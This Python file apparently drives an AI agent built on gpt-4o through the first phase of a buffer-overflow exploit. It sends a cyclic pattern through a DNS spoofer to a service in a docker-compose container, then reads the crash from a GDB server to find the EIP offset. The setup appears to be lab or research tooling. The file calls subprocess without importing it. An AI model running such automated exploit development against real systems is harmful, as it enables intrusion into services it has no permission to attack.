# main.py
import socket
import time
import json
from dotenv import load_dotenv
from agent import ExploitAgent

load_dotenv()

TARGET_HOST = 'target' # The service name from docker-compose.yml
TARGET_PORT = 8080

class GDBClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Keep trying to connect until the target container is ready
        for _ in range(10):
            try:
                self.sock.connect((self.host, self.port))
                print("Connected to GDB MCP Server.")
                return
            except ConnectionRefusedError:
                time.sleep(1)
        raise ConnectionRefusedError("Could not connect to GDB server.")

    def send_command(self, method, params=None):
        if not self.sock:
            self.connect()
        
        request = {"jsonrpc": "2.0", "method": method, "params": params or {}, "id": 1}
        self.sock.sendall(json.dumps(request).encode())
        response_data = self.sock.recv(4096)
        return json.loads(response_data.decode())

    def close(self):
        if self.sock:
            self.sock.close()

def run_exploit():
    agent = ExploitAgent(model_name="openai/gpt-4o")
    gdb_client = GDBClient(TARGET_HOST, TARGET_PORT)
    gdb_client.connect()

    # --- Phase 1: Find Offset ---
    print("--- 🚀 PHASE: Find EIP Offset ---")
    pattern = agent.generate_cyclic_pattern(1200)
    
    # Use the DNS spoofer to send the payload
    subprocess.run(['python3', 'dns_spoofer.py', '--payload', pattern.encode().hex()])
    subprocess.run(['dig', '@127.0.0.1', 'dos.com'], capture_output=True, check=False)
    
    # Tell GDB to run and get the crash info
    crash_info = gdb_client.send_command('run_and_wait_for_crash')
    offset = agent.analyze_crash_and_get_offset(json.dumps(crash_info))
    print(f"Agent determined offset: {offset}")
    print("--- ✅ SUCCESS: Find EIP Offset ---")
    
    # In a real loop, you would now close the client, restart the containers,
    # and run the next phase. For simplicity, we stop here.
    print("\n🎉 Minimal exploit sequence complete. Offset found.")
    gdb_client.close()

if __name__ == "__main__":
    run_exploit()